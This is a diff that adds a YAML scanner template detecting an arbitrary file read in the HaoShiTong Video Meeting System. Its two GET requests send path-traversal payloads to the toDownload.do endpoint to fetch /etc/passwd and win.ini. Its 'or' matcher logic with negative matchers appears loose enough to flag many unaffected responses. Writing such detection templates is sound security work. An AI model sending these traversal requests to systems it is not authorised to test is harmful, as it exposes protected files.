@@ -1,0 +1,32 @@
+id: haoshitong-video-meeting-arbitrary-file-read
+info:
+  name: HaoShiTong Video Meeting System Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini'
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "; for 16-bit app support"
+        part: body
+      - type: regex
+        regex:
+          - "/bin/"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+      - type: regex
+        regex:
+          - "</html>"
+        part: body
+        negative: true
